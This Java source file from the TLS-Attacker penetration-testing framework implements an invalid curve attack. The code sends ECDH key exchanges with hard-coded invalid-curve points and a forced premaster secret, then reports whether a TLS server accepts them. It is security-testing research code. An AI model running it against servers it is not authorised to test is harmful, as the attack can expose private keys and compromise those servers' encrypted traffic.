/**
 * TLS-Attacker - A Modular Penetration Testing Framework for TLS
 *
 * Copyright 2014-2016 Ruhr University Bochum / Hackmanit GmbH
 *
 * Licensed under Apache License 2.0
 * http://www.apache.org/licenses/LICENSE-2.0
 */
package de.rub.nds.tlsattacker.attacks.impl;

import de.rub.nds.tlsattacker.tls.Attacker;
import de.rub.nds.tlsattacker.attacks.config.InvalidCurveAttackCommandConfig;
import de.rub.nds.tlsattacker.modifiablevariable.ModifiableVariableFactory;
import de.rub.nds.tlsattacker.modifiablevariable.biginteger.BigIntegerModificationFactory;
import de.rub.nds.tlsattacker.modifiablevariable.biginteger.ModifiableBigInteger;
import de.rub.nds.tlsattacker.modifiablevariable.bytearray.ByteArrayModificationFactory;
import de.rub.nds.tlsattacker.modifiablevariable.bytearray.ModifiableByteArray;
import de.rub.nds.tlsattacker.tls.config.ConfigHandler;
import de.rub.nds.tlsattacker.tls.constants.HandshakeMessageType;
import de.rub.nds.tlsattacker.tls.exceptions.WorkflowExecutionException;
import de.rub.nds.tlsattacker.tls.protocol.handshake.ECDHClientKeyExchangeMessage;
import de.rub.nds.tlsattacker.tls.util.LogLevel;
import de.rub.nds.tlsattacker.tls.workflow.TlsContext;
import de.rub.nds.tlsattacker.tls.workflow.WorkflowExecutor;
import de.rub.nds.tlsattacker.tls.workflow.WorkflowTrace;
import de.rub.nds.tlsattacker.transport.TransportHandler;
import java.math.BigInteger;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.bouncycastle.util.BigIntegers;

/**
 * 
 * @author Juraj Somorovsky <juraj.somorovsky@rub.de>
 */
public class InvalidCurveAttack extends Attacker<InvalidCurveAttackCommandConfig> {

    private static final Logger LOGGER = LogManager.getLogger(InvalidCurveAttack.class);

    /**
     * EC field size, currently set to 32, works for curves with 256 bits!
     * (TODO)
     */
    private static final int CURVE_FIELD_SIZE = 32;

    private static final int PROTOCOL_FLOWS = 15;

    public InvalidCurveAttack(InvalidCurveAttackCommandConfig config) {
        super(config);
    }

    @Override
    public void executeAttack(ConfigHandler configHandler) {

        if (config.getPublicPointBaseX() == null || config.getPublicPointBaseY() == null
                || config.getPremasterSecret() == null) {

            config.setPublicPointBaseX(new BigInteger(
                    "b70bf043c144935756f8f4578c369cf960ee510a5a0f90e93a373a21f0d1397f", 16));
            config.setPublicPointBaseY(new BigInteger(
                    "4a2e0ded57a5156bb82eb4314c37fd4155395a7e51988af289cce531b9c17192", 16));
            config.setPremasterSecret(new BigInteger(
                    "b70bf043c144935756f8f4578c369cf960ee510a5a0f90e93a373a21f0d1397f", 16));
            for (int i = 0; i < PROTOCOL_FLOWS; i++) {
                try {
                    WorkflowTrace trace = executeProtocolFlow(configHandler);
                    if (trace.getActuallyRecievedHandshakeMessagesOfType(HandshakeMessageType.FINISHED).isEmpty()) {

                    } else {
                        LOGGER.log(LogLevel.CONSOLE_OUTPUT, "Vulnerable to the invalid curve attack.");
                        vulnerable = true;
                        return;
                    }
                } catch (WorkflowExecutionException ex) {
                    LOGGER.debug(ex.getLocalizedMessage());
                }
            }
            LOGGER.log(LogLevel.CONSOLE_OUTPUT, "NOT vulnerable to the invalid curve attack.");
        } else {
            executeProtocolFlow(configHandler);
        }
    }

    private WorkflowTrace executeProtocolFlow(ConfigHandler configHandler) {
        TransportHandler transportHandler = configHandler.initializeTransportHandler(config);
        TlsContext tlsContext = configHandler.initializeTlsContext(config);
        WorkflowExecutor workflowExecutor = configHandler.initializeWorkflowExecutor(transportHandler, tlsContext);

        WorkflowTrace trace = tlsContext.getWorkflowTrace();
        ECDHClientKeyExchangeMessage message = (ECDHClientKeyExchangeMessage) trace
                .getFirstConfiguredSendMessageOfType(HandshakeMessageType.CLIENT_KEY_EXCHANGE);

        // modify public point base X coordinate
        ModifiableBigInteger x = ModifiableVariableFactory.createBigIntegerModifiableVariable();
        x.setModification(BigIntegerModificationFactory.explicitValue(config.getPublicPointBaseX()));
        message.setPublicKeyBaseX(x);

        // modify public point base Y coordinate
        ModifiableBigInteger y = ModifiableVariableFactory.createBigIntegerModifiableVariable();
        y.setModification(BigIntegerModificationFactory.explicitValue(config.getPublicPointBaseY()));
        message.setPublicKeyBaseY(y);

        // set explicit premaster secret value (X value of the resulting point
        // coordinate)
        ModifiableByteArray pms = ModifiableVariableFactory.createByteArrayModifiableVariable();
        byte[] explicitePMS = BigIntegers.asUnsignedByteArray(CURVE_FIELD_SIZE, config.getPremasterSecret());
        pms.setModification(ByteArrayModificationFactory.explicitValue(explicitePMS));
        message.setPremasterSecret(pms);

        workflowExecutor.executeWorkflow();

        tlsContexts.add(tlsContext);

        transportHandler.closeConnection();

        return trace;
    }

}
